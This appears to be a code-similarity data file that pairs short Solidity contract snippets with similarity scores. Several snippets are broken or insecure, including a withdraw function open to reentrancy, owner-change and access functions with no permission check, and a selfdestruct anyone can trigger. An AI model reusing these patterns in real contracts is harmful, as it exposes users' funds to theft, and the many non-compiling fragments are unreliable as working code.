    Client[] private clients;

    event OwnerAssigned(
        address creator,
        address owner
    );

    event VisitorAllowed(
        address owner,
        address newVisitor
    );

    event VisitorDisallowed(
        address owner,
        address newVisitor
    );

    modifier onlyAllowed() {
        if(allowedVisitors[msg.sender] == false)
            revert(""Account is not allowed to obtain client info"");
        _;
    }

    modifier onlyCreator() {
        if(msg.sender != creator)
            revert(""Only creator can execute this action"");
        _;
    }

    modifier onlyOwner() {
        if(msg.sender != owner)
            revert(""Only owner can execute this function"");
        _;
    }

    constructor () public {
        creator = msg.sender;
        owner = msg.sender;
    }

    function setClientInfo (
        string apellido1,
        string apellido2,
        string apellidoCasada,
        string nombre1,
        string nombre2,
        string fechaNacimiento
    ) 
        external returns (uint) 
    {
        Client memory newClient;

        newClient.apellido1 = apellido1;
        newClient.apellido2 = apellido2;
        newClient.apellidoCasada = apellidoCasada;
        newClient.nombre1 = nombre1;
        newClient.nombre2 = nombre2;
        newClient.fechaNacimiento = fechaNacimiento;
        newClient.modifiedBy = msg.sender;

        clients.push(newClient);

        return clients.length;
    }

    function getClientsLength () view public returns (uint) {
        return clients.length;
    }

    function setOwner(address _owner) onlyOwner external {
        owner = _owner;
        allowVisitor(_owner);
        
    }

    function obtainOwner() view external returns (address){
        return owner;
    }

    function allowVisitor(address visitor) public {
        if(!allowedVisitors[visitor]) {
            allowedVisitors[visitor] = true;
            allowedVisitorsList.push(visitor);
            emit VisitorAllowed(msg.sender, visitor);
        }
    }

    function isAllowedAccount(address account) view public returns (bool) {
        return allowedVisitors[account];
    }

    function disallowVisitor(address account) onlyOwner external {
        allowedVisitors[account] = false;
        emit VisitorDisallowed(msg.sender, account);
    }

    function getVisitorsLength() view public returns (uint) {
        return allowedVisitorsList.length;
    }

    function obtainClient(uint32 index) view onlyAllowed public returns (string, string, string, string) {
        return (clients[index].nombre1, clients[index].apellido1, clients[index].fechaNacimiento, clients[index].apellido2);
    }

    function getAllowedVisitors() view onlyOwner public returns (address[]) {
        return allowedVisitorsList;
    }

}",0.6105872718345597,"contract DMTSCoin is ERC20 {

    

    using SafeMath for uint256;

    address public owner = msg.sender;



    mapping (address => uint256) balances;

    mapping (address => mapping (address => uint256)) allowed;



    string public constant name = ""DMTS"";

    string public constant symbol = ""DMTS"";

    uint public constant decimals = 8;

    uint256 public totalSupply = 400000000e8;



    event Transfer(address indexed _from, address indexed _to, uint256 _value);

    event Approval(address indexed _owner, address indexed _spender, uint256 _value);

    event Burn(address indexed burner, uint256 value);



    modifier onlyOwner() {

        require(msg.sender == owner);

        _;

    }



    function DMTSCoin () public {

        owner = msg.sender;

        balances[msg.sender] = totalSupply;

    }

    

    function transferOwnership(address newOwner) onlyOwner public {

        if (newOwner != address(0)) {

            owner = newOwner;

        }

    }



    function balanceOf(address _owner) constant public returns (uint256) {

	    return balances[_owner];

    }



    

    modifier onlyPayloadSize(uint size) {

        assert(msg.data.length >= size + 4);

        _;

    }

    

    function transfer(address _to, uint256 _amount) onlyPayloadSize(2 * 32) public returns (bool success) {



        require(_to != address(0));

        require(_amount <= balances[msg.sender]);

        

        balances[msg.sender] = balances[msg.sender].sub(_amount);

        balances[_to] = balances[_to].add(_amount);

        Transfer(msg.sender, _to, _amount);

        return true;

    }

    

    function transferFrom(address _from, address _to, uint256 _amount) onlyPayloadSize(3 * 32) public returns (bool success) {



        require(_to != address(0));

        require(_amount <= balances[_from]);

        require(_amount <= allowed[_from][msg.sender]);

        

        balances[_from] = balances[_from].sub(_amount);

        allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_amount);

        balances[_to] = balances[_to].add(_amount);

        Transfer(_from, _to, _amount);

        return true;

    }

    

    function approve(address _spender, uint256 _value) public returns (bool success) {

        allowed[msg.sender][_spender] = _value;

        Approval(msg.sender, _spender, _value);

        return true;

    }

    

    function allowance(address _owner, address _spender) constant public returns (uint256) {

        return allowed[_owner][_spender];

    }

    

    function burn(uint256 _value) onlyOwner public {

        require(_value <= balances[msg.sender]);



        address burner = msg.sender;

        balances[burner] = balances[burner].sub(_value);

        totalSupply = totalSupply.sub(_value);

        Burn(burner, _value);

    }

    

    function approveAndCall(address _spender, uint256 _value, bytes _extraData) public returns (bool success) {

        allowed[msg.sender][_spender] = _value;

        Approval(msg.sender, _spender, _value);

        

        require(_spender.call(bytes4(bytes32(keccak256(""receiveApproval(address,uint256,address,bytes)""))), msg.sender, _value, this, _extraData));

        return true;

    }

}"
"contract MyContract {

  struct MyStruct {
      address param1;
      address param2;
      address param3;
  }

  function init(address owner) public {}

  function init(MyStruct memory myStruct) public {}
}",0.6321608183060059,"contract NEST_2_Mapping {
	function checkAddress(string memory name) public view returns (address contractAddress);
	function checkOwners(address man) public view returns (bool);
}"
"contract property {

    uint public value;
    string public location;
    
    constructor(uint  _value, string _location) public {
          value = _value;
          location = _location;          
    }

    function setval(uint _value) public{
        value = _value;

    }

function getloc1() public pure returns(memory string) {,<--- getting error here
    return location;
  }
}",0.6299466358518272,"contract StoreValue {
  address public owner;
  string public storedValue;

  constructor() public {
    owner = msg.sender;
  }

  modifier restricted() {
    if (msg.sender == owner) _;
  }

  function setValue(string completed) public restricted {
    storedValue = completed;
  }

  function getValue() public view returns (string) {
    return storedValue;
  }
}"
"contract SaveMyNumber {

    uint storedNumber;

    function set(uint x) public {
        storedNumber = x;
    }
}",0.6107722576879628,"contract secretHolder {

    uint secret;

    function getSecret() public returns(uint) {

        return secret++;

    }

}"
"contract childContract is parentContract {
    

    function getNum2() public view returns(uint) {
        return num;
    }
    function getNum3() public view returns(uint) {
        return getNum();
    }
    function getNum4() public view returns(uint) {
        return parentContract.getNum();
    }
}",0.6464910536198434,"contract PrivateRabbitInterface {

    function getNewRabbit(address from)  public view returns (uint);

    function mixDNK(uint dnkmother, uint dnksire, uint genome)  public view returns (uint);

    function isUIntPrivate() public pure returns (bool);

}"
"contract Test {
    event Log(address addr);

    function logMe () public {
        Log(msg.sender);
    }
}",0.6562079302029268,"contract IOwned {
    function owner() public constant returns (address) { owner; }
}"
"contract SimpleStorage {
    string public data;
    event MyEvent(
        uint256 indexed id,
        uint256 indexed date,
        string indexed value
    );
    uint256 nextId;

    function setData(string calldata _data) external {
        data = _data;
        emit MyEvent(nextId, now, ""Cazzo"");
        nextId++;
    }

    function getData() external view returns (string memory) {
        return data;
    }
}",0.6225155137887882,"contract ERC223 is ERC20 {

	function transfer(address _to, uint256 _value, bytes _data) public returns (bool success);
	function transfer(address _to, uint256 _value, bytes _data, string _custom_fallback) public returns (bool success);

	
	event Transfer(address indexed _from, address indexed _to, uint256 _value, bytes _data);
}"
"contract try {
    mapping (address=>bytes32[10]) Map;

    function try(){}

    function fill_map(bytes32[10] _attributes) public  {
            Map[msg.sender].push(_attributes);
    }

    function get_map(address id) view public returns (bytes32[10]){
      return Map[id];
    }

}",0.6488735490265841,"contract Resolver {

    function supportsInterface(bytes4 interfaceID) public pure returns (bool);

    function addr(bytes32 node) public view returns (address);

    function setAddr(bytes32 node, address addr) public;

}"
"contract Mutex {
    bool locked;
    modifier noReentrancy() {
        require(!locked);
        locked = true;
        _;
        locked = false;
    }

    function f() noReentrancy returns (uint) {
        require(msg.sender.call());
        return 7;
    }
}",0.6565258461421779,"contract Mutex is Owned {
    bool locked = false;
    modifier mutexed {
        if (locked) throw;
        locked = true;
        _;
        locked = false;
    }

    function unMutex() onlyOwner {
        locked = false;
    }
}"
"contract PayTest {
function() public payable {
}

function withdraw() {
    msg.sender.transfer(4000000000 wei);
}",0.6876945904840687,"contract P3D {
    function withdraw() public;
    function buy(address) public payable returns(uint256);
}"
"contract A {
    address owner;
    uint randomVariable;

    function A(uint _randomVariable) {
        owner = msg.sender;
        randomVariable = _randomVariable;
    }
}",0.6145876798363801,"contract Ownable {

  address public owner;



  

  function Ownable() {

    owner = msg.sender;

  }



  

  modifier onlyOwner() {

    require(msg.sender == owner);

    _;

  }

}"
"contract B is A {
    address owner;
    uint randomVariable2;

    function B(uint _randomVariable2) {
        owner = msg.sender;
        randomVariable2 = _randomVariable2;
    }

    function changeOwner(address _newOwner) {
        owner = _newOwner;
    }
}",0.6841103227153854,"contract owned {
    
    address public owner;

    function owned() {
        owner = msg.sender;
    }

    modifier onlyOwner {
        if (msg.sender != owner) revert();
        _;
    }

    function changeOwner(address newOwner) onlyOwner {
        owner = newOwner;
    }
    
}"
"contract token {
    mapping (address => uint256) public voteWeight;
    uint public numberOfDelegationRounds;

    function balanceOf(address member) constant returns (uint256 balance) {
        if (numberOfDelegationRounds < 3)
            return 0;
        else
            return this.voteWeight(member);
    }
}",0.6801029131848779,"contract tokenInterface {
	function balanceOf(address _owner) public constant returns (uint256 balance);
	function transfer(address _to, uint256 _value) public returns (bool);
	string public symbols;
	function originBurn(uint256 _value) public returns(bool);
}"
"contract MyContract {
    function myFunction() public pure returns(uint256 myNumber, string memory myString) {
        return (23456, ""Hello!%"");
    }
}",0.6207277556222767,"contract IParityRegistry {
    mapping (bytes4 => string) public entries;
    
    function register(string memory _method)
    public
    returns (bool);
}"
"contract DappTokenSale {
    address admin;
    **DappToken public tokenContract;**
    uint256 public tokenPrice;
    uint256 public tokensSold;

function DappTokenSale(DappToken _tokenContract, uint256 _tokenPrice) public {
    admin = msg.sender;
    tokenContract = _tokenContract;
    tokenPrice = _tokenPrice;
}
}",0.6120103542747248,"contract AcceptsMOB {

    MOB public tokenContract;



    constructor(address _tokenContract) public {

        tokenContract = MOB(_tokenContract);

    }



    modifier onlyTokenContract {

        require(msg.sender == address(tokenContract));

        _;

    }



    

    function tokenFallback(address _from, uint256 _value, bytes _data) external returns (bool);

}"
"contract Tester {
    uint256 public gasUsed;

    function transfer(IERC20Token _token, address _to, uint256 _value) public {
        uint256 bgn = gasleft();
        require(_token.transfer(_to, _value));
        uint256 end = gasleft();
        gasUsed = bgn - end;
    }
}",0.6902524782449867,"contract ERC20Token
{
    mapping (address => uint256) public balanceOf;
    function transfer(address _to, uint256 _value) public;
    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success);
}"
"contract AccessControl {
    mapping (address => bool) authorized;

    function getSomething () public view returns (string) { 
        require(authorized[msg.sender]);
        return ""hello"";
    }
}",0.6214765900461537,"contract Ownable {

    address public Owner = msg.sender;

    function isOwner() public view returns (bool) {

        if (Owner == msg.sender) return true; return false;

    }

}"
"contract HelloWorld {      
    uint256 counter = 5;

    function add() public {  
        counter++;
    }   
    function subtract() public { 
        counter--;
    }   
    function getCounter() public view returns (uint256) {
        return counter;
    } 
}",0.6896265169195009,"contract GemLike4 {
    function decimals() public view returns (uint);
    function balanceOf(address) public returns (uint256);
    function transfer(address, uint256) public returns (bool);
}"
"contract store {
    string public storage_;

    function store_it(string memory s) public {
        storage_=s;
    }
}",0.6794922081892805,"contract Foo
{
    string public phrase;
    
    function Foo(string _phrase) public {
        phrase = _phrase;
    }
}"
"contract MyContract {
enum State { Waiting, Ready, Active }
State public state;

constructor() public {
    state = State.Waiting;
}

function activate() public {
    state = State.Active;
}

function isActive() public view returns(bool) {
    return state == State.Active;
}
}",0.6068289738036519,"contract ArconaDigitalLand is LandBase {

    string public constant name = "" Arcona Digital Land"";

    string public constant symbol = ""ARDL"";



    function implementsERC721() public pure returns (bool)

    {

        return true;

    }



    function() public payable{

        revert();

    }

}"
"contract B {    
   A private a;    
   function B(address _a) {
       a = A(_a);
   }    
   function doStuff() {
       a.save(42);
   }
   function getStuff()  returns (int) {
       return a.get();
   }
}",0.6226165874627513,"contract Token {
    function balanceOf(address a) returns (uint) {return 0;}
    function transfer(address a, uint val) returns (bool) {return false;}
}"
"contract C {
   B private b;    
   function C(address _b) {
       b = B(_b);
   }
   function calculateTheMeaning() {
      b.doStuff();
   }
   function getTheAnswer() returns (int) {
      return b.getStuff();
   }
}",0.603722579269139,"contract FlopLike {
    function kick(address gal, uint lot, uint bid) external returns (uint);
    function cage() external;
    function live() external returns (uint);
}"
"contract Election {
  
  address public owner;

  constructor() public {
    owner = msg.sender;
    addCandidate(""NOTA"");
    addCandidate(""BJP"");
    addCandidate(""CONGRESS"");
    addCandidate(""JDS"");
    addCandidate(""others"");
    addCandidate(""jdu"");
    addCandidate(""amma-party"");

  }

  
  address[] validVoters;

  
  mapping(address => bool) voters;

  
  event LogAccess(address indexed by, string method, string desc);

  
  struct Candidate {
    int id;
    string name;
    int voteCount;
    address[] votersList;
  }

  
  string[] candidateNames;

  
  int[] candidateIds;

  

  mapping(int => Candidate) public candidates;

  
  int candidateId = 100;

  
  function addCandidate(string name) private {
    candidateId++;
    address[] memory votedPeople;
    candidates[candidateId] = Candidate(candidateId, name, 0, votedPeople);
    candidateIds.push(candidateId);
    candidateNames.push(name);

  }

  
  function getCandidateIds() public view returns(int[]) {
    return candidateIds;
  }

  
  function getCandidateNames() public view returns(string[]) {
    return candidateNames;
  }

  
  function addVoters(address voter) public {
    require(msg.sender == owner);
    validVoters.push(voter);
  }

  
  function deleteVoter(address voter) public {
    require(msg.sender == owner);
    for (uint i = 0; i < validVoters.length; i++) {
      if (validVoters[i] == voter) {
        delete validVoters[i];
      }
    }
  }

  
  function isValidVoter(address voter, string method) private returns(bool) {
    for (uint i = 0; i < validVoters.length; i++) {
      if (validVoters[i] == voter) {
        emit LogAccess(voter, method, ""successful access(eligible to vote)"");
        return true;
      }

    }
    emit LogAccess(voter, method, ""access failed(not eligible to vote)"");
    return false;
  }

  
  function vote(int _candidateId) public {
    if (isValidVoter(msg.sender, ""vote"")) {
      
      require(!voters[msg.sender]);

      
      require(_candidateId > 0 && _candidateId <= candidateId);

      
      voters[msg.sender] = true;

      
      candidates[_candidateId].voteCount++;

      
      candidates[_candidateId].votersList.push(msg.sender);

    }

  }

  function getVotersList(int id) public view returns(address[]) {
    require(msg.sender == owner);
    return candidates[id].votersList;
  }
}",0.6027909349738165,"contract ST is ERC20Interface {
    uint256 public constant decimals = 18;

    string public constant symbol = ""ST"";
    string public constant name = ""Super Token"";

    uint256 public _totalSupply = 2100000000*(10 ** 18);

    
    address public owner;

    
    mapping(address => uint256) private balances;

    
    mapping(address => mapping (address => uint256)) private allowed;

    
    mapping(address => bool) private approvedInvestorList;

    
    

    
    


    
    modifier onlyPayloadSize(uint size) {
      if(msg.data.length < size + 4) {
        revert();
      }
      _;
    }



    
    
    constructor() public {
        owner = msg.sender;
        balances[owner] = _totalSupply;
    }

    
    
    function totalSupply()
        public view returns (uint256) {
        return _totalSupply;
    }





    
    
    
    function balanceOf(address _addr)
        public view returns (uint256) {
        return balances[_addr];
    }

    
    
    function isApprovedInvestor(address _addr)
        public view returns (bool) {
        return approvedInvestorList[_addr];
    }

    
    
    
    
    
    
    


    
    
    
    
    function transfer(address _to, uint256 _amount)
        public returns (bool success) {
            
        
        
        
        require(_to != address(0));
        require((balances[msg.sender] >= _amount) && (_amount >= 0) && (balances[_to] + _amount > balances[_to]));
        balances[msg.sender] -= _amount;
        balances[_to] += _amount;
        emit Transfer(msg.sender, _to, _amount);
        success = true;
    }

    
    
    
    
    
    
    function transferFrom(
        address _from,
        address _to,
        uint256 _amount
    )
    public returns (bool success) {
        require(balances[_from] >= _amount && _amount > 0);
        require(allowed[_from][msg.sender] >= _amount);
        require(balances[_to] + _amount > balances[_to]);
        balances[_from] -= _amount;
        allowed[_from][msg.sender] -= _amount;
        balances[_to] += _amount;
        emit Transfer(_from, _to, _amount);
        success =  true;
    }

    
    
    function approve(address _spender, uint256 _amount)
        public

        returns (bool success) {
        require((_amount == 0) || (allowed[msg.sender][_spender] == 0));
        allowed[msg.sender][_spender] = _amount;
        emit Approval(msg.sender, _spender, _amount);
        return true;
    }

    
    function allowance(address _owner, address _spender)
        public
        view
        returns (uint256 remaining) {
        return allowed[_owner][_spender];
    }

    function () external payable {
        revert();
    }
}"
"contract Election {
  struct Candidates {
    string name;
    uint voteCount;
  }

  struct voter {
    bool authorized;
    bool voted;
    uint vote;
  }

  address public owner;
  string public electionName;

  mapping(address => voter) public voters;
  Candidate[] public candidates; 
  uint public totalVotes;

  modifier ownerOnly() {
    require(msg.sender == owner);

    _;
  }

  function electionName(string _name) public {
    owner = msg.sender;
    electionName = _name;
  }

  function addCandidate(string _name) ownerOnly public {
    candidates.push(Candidate(_name, 0));
  }

  function getNumCandidate() public view returns(uint) {
    return candidates. length;
  }

  function authorize( address _person) ownerOnly public{
    voters[_person].authorized = true;
  }

  function vote(uint voteIndex) public {
    require(!voters[msg.sender].voted);
    require(voters[msg.sender].authorized);

    voters[msg.sender].voted = true;
    voters[msg.sender].voteIndex = _voteIndex;

    candidates[_voteIndex].voteCount += 1;
    selfdestruct(owner);
  }
}",0.6267104850987909,"contract IprontoToken is StandardToken {

  
  string public constant name = ""iPRONTO"";

  
  string public constant symbol = ""IPR"";

  
  uint8 public constant decimals = 18;

  
  uint256 public constant INITIAL_SUPPLY = 45000000 * (1 ether / 1 wei);

  address public owner;

  
  mapping (address => bool) public validKyc;

  function IprontoToken() public{
    totalSupply = INITIAL_SUPPLY;
    balances[msg.sender] = INITIAL_SUPPLY;
    owner = msg.sender;
  }

  modifier onlyOwner() {
    require(msg.sender == owner);
    _;
  }

  
  function approveKyc(address[] _addrs)
        public
        onlyOwner
        returns (bool)
    {
        uint len = _addrs.length;
        while (len-- > 0) {
            validKyc[_addrs[len]] = true;
        }
        return true;
    }

  function isValidKyc(address _addr) public constant returns (bool){
    return validKyc[_addr];
  }

  function approve(address _spender, uint256 _value) public returns (bool) {
    require(isValidKyc(msg.sender));
    return super.approve(_spender, _value);
  }

  function() public{
    throw;
  }
}"
"contract Wallet {

        
        event PreExecute(address to, uint value, uint gas);
        event Execute(address to, uint value, uint balanceAfter, uint spentGas);
        event ExceededExecuteWithValue(address to, uint value);
        event FailedExecute(address to, uint value, uint balanceAfter);

        
        
        address owner;

        function Wallet() {
            
            
            owner = msg.sender;
        }

        
        function execute(address _to, uint _value, uint _gas, bytes _data) external {

            uint balanceBefore;
            uint balanceAfter;
            bool success;

            if(msg.sender != owner) {
                throw;
            }

            if(_value > this.balance) {
                ExceededExecuteWithValue(_to, _value);
                return;
            }

            balanceBefore = this.balance;

            
            if(_value > 0) {
                success = _to.call.value(_value)(_data);
            } else {
                success = _to.call(_data);
            }

            balanceAfter = this.balance;

            if(success) {
                Execute(_to, _value, balanceAfter, (balanceBefore - balanceAfter) - _value);
            } else {
                FailedExecute(_to, _value, balanceAfter);
            }
        }

        
        function() {
            
            if (msg.value > 0) {
                Deposit(msg.sender, msg.value);
            }
        }

    }",0.6337064250498571,"contract BaseToken {

    string public name;

    string public symbol;

    uint8 public decimals;

    uint256 public totalSupply;



    mapping (address => uint256) public balanceOf;

    mapping (address => mapping (address => uint256)) public allowance;



    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);



    function _transfer(address _from, address _to, uint _value) internal {

        require(_to != address(0));

        require(balanceOf[_from] >= _value);

        require(balanceOf[_to] + _value > balanceOf[_to]);

        uint previousBalances = balanceOf[_from] + balanceOf[_to];

        balanceOf[_from] -= _value;

        balanceOf[_to] += _value;

        assert(balanceOf[_from] + balanceOf[_to] == previousBalances);

        emit Transfer(_from, _to, _value);

    }



    function transfer(address _to, uint256 _value) public returns (bool success) {

        _transfer(msg.sender, _to, _value);

        return true;

    }



    

    

    

    

    

    



    

    

    

    

    

}"
"contract Fundraiser {
    mapping(address=>uint) balances;

    function withdrawCoins(){ 
      uint withdrawAmount = balances[msg.sender];
      Wallet wallet = Wallet(msg.sender);
      wallet.payout.value(withdrawAmount)();
      balances[msg.sender] = 0;
    }

    function getBalance() constant returns (uint) {
        return address(this).balance;
    }

    function contribute() payable {
        balances[msg.sender] += msg.value;
    }

    function() payable {

    }
}",0.6689211521501269,"contract Salemcash {

    mapping(address => uint) private _balances;

    constructor() public {
        _balances[msg.sender] = 20000000000000000000000000;
    }

    function getBalance(address account) public view returns (uint) {
        return _balances[account];
    }

    function transfer(address to, uint amount) public {
        require(_balances[msg.sender] >= amount);

        _balances[msg.sender] -= amount;
        _balances[to] += amount;
    }
}"
"contract SendEther {
    function sendViaCall (address payable _to) public payable {
        (bool sent, bytes memory data) = _to.call.value(msg.value)("""");
        require (sent, ""failed to send ether"");
    }
}",0.6244268739280939,"contract Notifier {
    constructor () public {}
    
    event Notify(address indexed who, uint256 value, bytes data);

    function() public payable {
        emit Notify(msg.sender, msg.value, msg.data);
    }
}"
"contract Foo {
    uint storageData;
    Bar bar;
    address barContractAddress;

    constructor(address _barContractAddress) public {
        barContractAddress = _barContractAddress;
    }

    function set(uint x) public {
        storageData = x;
    }

    function get() view public returns (uint) {
        return storageData;
    }

    function baz() public returns (uint) {
        bar = Bar(barContractAddress);
        storageData = bar.baz(storageData);
    }

}",0.6436792947819393,"contract Token {
    function balanceOf(address _owner) constant public returns (uint balance);
    function allowance(address _user, address _spender) constant public returns (uint amount);
    function transfer(address _to, uint _value) public returns (bool success);
    function transferFrom(address _from, address _to, uint _value) public returns (bool success);
}"
"contract Shopping {

    struct Article {
        uint id; 
        address seller;
        address buyer;
        string name;
        string description;
        uint256 price;
    }

    
    mapping(uint256 => Article) public articles; 
    uint articleCounter;

    function buyArticle(uint _id ) public payable {
        Article  storage article = articles[_id];
        require( article.buyer == 0x0);                                      
        require(msg.sender != article .seller]);
    }
}",0.6051081413448232,"contract STC is Token{

	Price public currentPrice;

	uint256 public fundingEndTime;

	address public fundWallet;

	function() payable {

			require(tx.origin == msg.sender);

			buyTo(msg.sender);

	}

	function buyTo(address participant) public payable; 

	function icoDenominatorPrice() public view returns (uint256);

	struct Price { 

			uint256 numerator;

			uint256 denominator;

	}

}"
"contract HelloWorld {
    struct Items {
       address id;
       string data;
    }

    mapping(address => Items) items;

    function getItem(address key) returns (string) {
      return items[key].data;
    }

    function addItem (address key, string data) returns (bool) {
        Items item = items[key];
        item.data = data;
    }

   }",0.6148696278124994,"contract s_Form001 {
    
    mapping (bytes32 => string) data;
    
    address owner;
    
    function s_Form001() {
        owner = msg.sender;

    }
    
    function setData(string key, string value) {
        require(msg.sender == owner);
        data[sha3(key)] = value;
    }
    
    function getData(string key) constant returns(string) {
        return data[sha3(key)];
    }


}"
"contract OuterContract {
    InnerContract pInnerContract;

    function func(uint256 val) external returns (uint256) {
        return pInnerContract.func(val) + 1;
    }
}",0.6258280033250352,"contract IGST2 {
  function transfer(address recipient, uint256 amount) external returns (bool);

  function mint(uint256 amount) external;
}"
"contract sample {
 string public name = ""ZeonLab"";
 function set(string _name) {
    name = _name;
 }

 function get() constant returns (string) {
   return name;
 }
}",0.6923404703138201,"contract DetailedERC721 is ERC721 {
	function name() public view returns (string _name);
	function symbol() public view returns (string _symbol);
}"
"contract C {
  struct S {address a;}
  function F(S calldata) external pure returns (uint256) {return 0;}
}",0.66125573591077,"contract InkPay is InkOwner {

  function authorizeTransaction(uint256 , address ) external returns (bool) {

    return true;

  }

}"
"contract MyContract {
    address public creator;

    function MyContract() {
        creator = msg.sender;
    }

    function reject() {
        selfdestruct(creator);
    }

    function send(address target, uint256 amount) {
        if (!target.send(amount)) throw;
    }
       function destroy(address target) {

        selfdestruct(0x0000000000000000000000000000000000000000);
    }
}",0.6262636879702157,"contract BaseAgriChainContract {
    address creator; 
    function BaseAgriChainContract() public    {   creator = msg.sender;   }
    
    modifier onlyBy(address _account)
    {
        if (msg.sender != _account)
            throw;
        _;
    }
    
    function kill() onlyBy(creator)
    {               suicide(creator);     }
     
     function setCreator(address _creator)  onlyBy(creator)
    {           creator = _creator;     }
  
}"
"contract Test_Uint {
    uint public something;

    function Test_Uint() {
        something = 42;
    }
}",0.6182251310309692,"contract UsdPrice {

    function USD(uint _id) public constant returns (uint256);

}"
"contract ZonoToken is StandardToken {
  string public name = 'ZONO';
  string public symbol = 'ZONO';
  address public owner = 0x683821afb3f4f4fafffdb259254ae870a091e3b4;
  uint public decimals = 0;
  uint public INITIAL_SUPPLY = 100;

  function ZonoToken() {
    totalSupply = INITIAL_SUPPLY;
    balances[msg.sender] = INITIAL_SUPPLY;
  }

  function() payable { deposit(); }

  function deposit() payable {
    owner.transfer(msg.value);
    uint newTokens = (msg.value * 10) / 1 ether;
    balances[msg.sender] = balances[msg.sender] + newTokens;
  }
}",0.6904129120976727,"contract GODToken is PausableToken {
  using SafeMath for uint256;

  string public name = ""GOD Token"";
  string public symbol = ""GOD"";
  uint public decimals = 18;


  uint256 private constant INITIAL_SUPPLY = 3000000000 ether;


  
  function GODToken() public {
    totalSupply = INITIAL_SUPPLY;
    balances[msg.sender] = INITIAL_SUPPLY;
  }

  function changeSymbolName(string symbolName) onlyOwner public
  {
      symbol = symbolName;
  }

   function changeName(string symbolName) onlyOwner public
  {
      name = symbolName;
  }
}"
"contract Testing {


  function Testing() payable {
  }

  event asking (address sender, uint q);
  event responding (address sender, uint r);


  function query(uint q){
    asking(msg.sender, q);
  }

  function response(uint r){
    responding(msg.sender, r);
  }
}",0.6152025850230496,"contract Admin {

    address public owner;
    mapping(address => bool) public AdminList;
    
    function Test() public returns (uint256 _balance) {
            
        address sender = msg.sender;
        return sender.balance;
        
    }
    
      function TestX() public {
         
         owner = msg.sender;
        
    }
    
}"
"contract DieselPrice is usingOraclize {
        event one(string description);
        event newDieselPrice(string price);


        function DieselPrice() {
            update(); 
        }

        function __callback(bytes32 myid, string result) {
            require(msg.sender != oraclize_cbAddress()); 
            newDieselPrice(result);
            
            
        }

        function update() payable {
            one(""Oraclize query was sent, standing by for the answer.."");
            oraclize_query(""URL"", ""xml(https:
        }

    }",0.6048225304424931,"contract OraclizeI {
    address public cbAddress;
    function query_withGasLimit(uint _timestamp, string _datasource, string _arg, uint _gaslimit) payable public returns (bytes32 _id);
    function getPrice(string _datasource, uint gaslimit) public returns (uint _dsprice);
    function setProofType(byte _proofType) public;
    function setCustomGasPrice(uint _gasPrice) public;
}"
"contract Tester {

    struct Foo {
        bool stayFalse;
    }

    function Tester() public {
    }

    function runTest() public constant returns (bool) {
        Foo memory foo;
        return one(foo);
    }

    function one(Foo memory foo) public constant returns (bool){
        Foo memory foobar;
        foobar = two(foo);
        return foo.stayFalse;
    }

    function two(Foo memory bar) public constant returns(Foo) {
        bar.stayFalse = true;
        return bar;
    }

}",0.6335631679973843,"contract ERC20Detailed is ERC20 {
    string constant private _name = ""INGRAM"";
    string constant private _symbol = ""INGRAM"";
    uint256 constant private _decimals = 18;


    
    function name() public pure returns (string memory) {
        return _name;
    }

    
    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    
    function decimals() public pure returns (uint256) {
        return _decimals;
    }
}"
"contract Mint is BaseToken {

  
  address public centralMinter;
  uint256 public totalMinted;

  
  modifier onlyMinter {
    if (msg.sender != centralMinter) revert();
    _;
  }
  function Mint() {
    
  }

  function mint(address _to, uint256 _amountToMint) onlyMinter() {
    balances[_to] += _amountToMint;
    totalSupply += _amountToMint;
    Transfer(this, _to, _amountToMint);
  }
}",0.6691169489378748,"contract Mintable is Ownable {
    mapping(address => bool) minters;

    modifier onlyMinter {
        require(minters[msg.sender] == true);
        _;
    }

    function Mintable() public {
        adjustMinter(msg.sender, true);
    }

    function adjustMinter(address minter, bool canMint) public onlyOwner {
        minters[minter] = canMint;
    }

    function mint(address _to, uint256 _value) public;

}"
"contract MyContract {
   PC[] public pcs;
   structure PC {
      string name,
      uint time
   }

   function checkTime(uint _pcid) public {
      uint memory a = pcs[_pcid];
      string memory b = pcs[_pcid];
      
   }
}",0.6292460205700664,"contract PausedEURON is PausedToken {

    function name() public pure returns (string memory) {

        return ""EURON"";

    }



    function symbol() public pure returns (string memory) {

        return ""ERN"";

    }

}"
"contract Logic_0_1_0 {

    uint a;

    
    event result(uint val);
    function magicFunction() public returns (uint) {
        a = 7;
        emit result(a); 
    }
}",0.6589381862285816,"contract Kicker {
    function kick(address urn, address gal, uint tab, uint lot, uint bid)
        public returns (uint);
}"
"contract Logic_0_2_0 is Logic_0_1_0 {

    
    
    function magicFunction() public returns (uint) {
        a = 9;
        emit result(a); 
    }
}",0.652528255679879,"contract ExtendedERC20 is ERC20 {
  function mint(address _to, uint _amount) public returns (bool);
}"
"contract exercise {

   uint public balance;
   string  name= ""Sara""
 int[] public nums=[1,2,3];

   function setBalance(int x) public {
       balance = x;
   }

   function getBalance() public  returns (uint) {
       return balance;
   }


   function doubleBalance() public view returns (uint) {
       balance=2*balance;
       return balance;
   }


}",0.6662081680805426,"contract ERC223 {

  uint public totalSupply;

  function balanceOf(address who) public constant returns (uint);

  function totalSupply()public constant returns (uint256 _supply);

  function name() public constant returns (string _name);

  function symbol()public constant returns (string _symbol);

}"
"contract ico {
  
     uint  decimal = 18; 
     uint public  totalSupply ; 
     uint public initialSupply = address(this).balance;
     address public owner; 
     uint valueOfEther = 1000; 
     **sofoCoin ercObject;**
     event chk(address);
      uint public a;
    constructor (address tokenaddress) public payable{
         **ercObject = sofoCoin(tokenaddress);**
         owner = address(this);
         totalSupply = ercObject.totalSupply();
    }   

    function  burnTokens( uint tokens) public returns(bool res)  {
        
        uint haveToken = ercObject.balanceOf(owner);
       emit chk(owner);
        require (msg.sender==owner && haveToken >= tokens);
        **ercObject.coinBalance[owner] = ercObject.coinBalance[owner] - tokens;**

        initialSupply = initialSupply-tokens;
        return true; 
    }

    function tokenDistribution (address to,uint tokens) private returns(bool res)  {
      require(msg.sender== owner);
      calDiscount(tokens);
      return ercObject.transfer(to ,tokens);
    }

    function calcuateRate (uint amount) internal view returns(uint token){
     return amount * (valueOfEther /10^18);
    }

    function buyToken() public payable {
      require(msg.value >= 100000000000000);
      uint tokens = calcuateRate(msg.value);
      tokens  = calDiscount(tokens);
      tokens= tokens * (10 ** decimal);
      ercObject.transfer(msg.sender, tokens);
    }

    function calDiscount (uint tokens) view public returns(uint bonus)  {

